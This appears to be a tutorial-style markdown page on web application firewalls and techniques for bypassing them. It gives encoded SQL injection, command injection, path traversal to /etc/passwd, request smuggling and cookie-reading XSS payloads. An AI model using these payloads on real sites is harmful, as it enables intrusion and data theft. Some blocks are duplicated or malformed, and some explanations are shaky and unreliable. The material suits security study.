## **WAF(Web Application Firewall):-** 
**Description:**
> A WAF inspects incoming web traffic to detect and filter out potentially malicious requests or payloads. It analyzes both the request (input) and response (output) of web applications.
>
>It is a security solution designed to protect web applications from various attacks, such as cross-site scripting (XSS), SQL injection, cross-site request forgery (CSRF), and other vulnerabilities that can be exploited over HTTP and HTTPS protocols.


**Deployment Options:**

>**Cloud-based:** WAF Provided as a service by cloud providers to protect web applications hosted in the cloud.
>
>**Network based WAF:** Deployed on-premises within an organization's network infrastructure to protect web applications hosted internally.
>
>**Host-based WAF:** Installed on individual web servers or application servers to protect specific applications or services.

**Benefits of Using a WAF:**

>**Enhanced Security:** Protects web applications from a wide range of attacks and vulnerabilities.
>
>**Regulatory Compliance:** Helps organizations comply with security and privacy regulations that require protection of web applications.
>
>**Reduced Risk of Data Breaches:** Mitigates the risk of data breaches and unauthorized access to sensitive information.

### **Here are some WAF Bypass Techniques:**

#### **1. Input Manipulation Techniques**

- **Obfuscation:** Obfuscation involves encoding or altering payloads to evade detection by signature-based filters.

  **Payload Example:** SQL Injection using URL encoding
    ```
    Original: ' OR 1=1 --
    Encoded: %27%20OR%201%3D1%20--
**Explanation:** The single quote (') is URL encoded as %27, space as %20, and equals (=) as %3D. This obfuscated payload might evade simple WAF filters looking for exact SQL injection patterns.

- **Concatenation:** Concatenation involves breaking up payloads or injecting additional characters to bypass filters.

     **Payload Example:** Command Injection using parameter splitting
     ```
     Original: ; ls /
    Split: ;%0als%20/
>**Explanation:** This technique injects a newline character (%0a) and space (%20) to split the command ls /, which might evade filters looking for specific command injection patterns.

- **Case Sensitivity:** Case sensitivity involves using mixed cases or alternative spellings to bypass case-sensitive filters.

     **Payload Example:** SQL Injection with lowercase
    ``` 
    Original: UNION SELECT username, password FROM users --
    Alternative: unION seLEct username, password from users --

> **Explanation:** By using different case combinations (UNION, unION, seLEct, from), this payload attempts to bypass filters that are case-sensitive.

- **Hexadecimal or Unicode Encoding:** Hexadecimal or Unicode encoding represents characters in different formats to evade character-based filters.

    **Payload Example:** Directory traversal using double URL encoding
    ```
    Original: /etc/passwd
    Double encoded: %252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

> **Explanation:** Characters like / (%2f) and . (%2e) are double URL encoded to %252f and %252e, which might bypass filters expecting single URL encoding.

#### **2. HTTP Protocol Violations**
- **Overlong UTF-8 Encoding:-** Overlong UTF-8 encoding uses excessively long sequences to bypass filters expecting standard UTF-8 encoding.

    **Payload Example:** SQL Injection with overlong UTF-8 encoding
    ```
    Original: ' OR 1=1 --
    Encoded with overlong UTF-8: %C0%27%20OR%201%3D1%20--
    ```
> **Explanation:** The %C0%27 sequence represents an overlong UTF-8 encoding of ', which might evade filters that check for standard UTF-8 sequences.

- **Overlong URL Encoding:-** Overlong URL encoding involves encoding characters multiple times to bypass URL decoding filters.

    **Payload Example:** XSS payload with overlong URL encoding
    ```
    Original: <script>alert(1)</script>
    Double encoded: %253C%252Fscr%2525%32Ft%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E
    ---
    **Overlong URL Encoding:-** Overlong URL encoding involves encoding characters multiple times to bypass URL decoding filters.

    **Payload Example:** XSS payload with overlong URL encoding
    ```
    Original: <script>alert(1)</script>
    Double encoded: %253C%252Fscr%2525%32Ft%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E

- **Double Encoding:-** Double encoding involves encoding special characters twice to bypass filters expecting single encoding.

    **Payload Example:-** SQL Injection with double URL encoding
    ```
    Original: .php?id=1
    Double encoded: .php%253fid%253d1
 
 > **Explanation:** Characters like . (%2e) and ? (%3f) are double URL encoded (%252e, %253f), which might bypass filters expecting single URL encoding.

### Request Smuggling 
- **Content-Length Discrepancy:-** Content-Length discrepancy exploits inconsistencies in Content-Length headers to confuse WAFs.

**Payload Example:** Exploiting Content-Length header discrepancy
```
POST /login HTTP/1.1
Host: example.com
Content-Length: 10

username=admin&password=pass
```
> **Explanation:** The Content-Length header claims 10 bytes, but the actual payload is longer (username=admin&password=pass), which might confuse WAFs relying on Content-Length for request validation.

- **Chunked Transfer Encoding:-** Chunked Transfer Encoding manipulates chunked encoding to evade WAF filters.

    **Payload Example:** Manipulating chunked encoding
    ```
    POST /upload HTTP/1.1
    Host: example.com
    Transfer-Encoding: chunked

    4
    data
    0
    ```
> **Explanation: T**he payload uses chunked encoding with an ambiguous boundary (0 after data), which might bypass filters expecting a specific chunked encoding structure.

#### Bypassing JavaScript Filters 
- **Event Handler Manipulation:-** Event handler manipulation bypasses filters blocking specific JavaScript event handlers.

**Payload Example:** Bypassing onmouseover filter
```
Original: <img src="x" onmouseover=alert(1)>
Modified: <img src="x" onmoUSeover=alert(1)>
```
> **Explanation:-** The onmouseover event handler is modified with mixed cases (onmoUSeover) to evade filters expecting exact event handler names.

- **DOM-based XSS:-** DOM-based XSS uses client-side techniques to bypass server-side WAF rules.

    **Payload Example:** Exploiting DOM-based XSS
    ```
    Original: <script>alert(document.cookie)</script>
    Modified: <img src="notexist" onerror="document.write('<script>alert(document.cookie)</scr'+'ipt>');">

> **Explanation:** The payload injects JavaScript through onerror attribute, using string concatenation (+'ipt>') to evade WAF filters expecting direct script tags.


















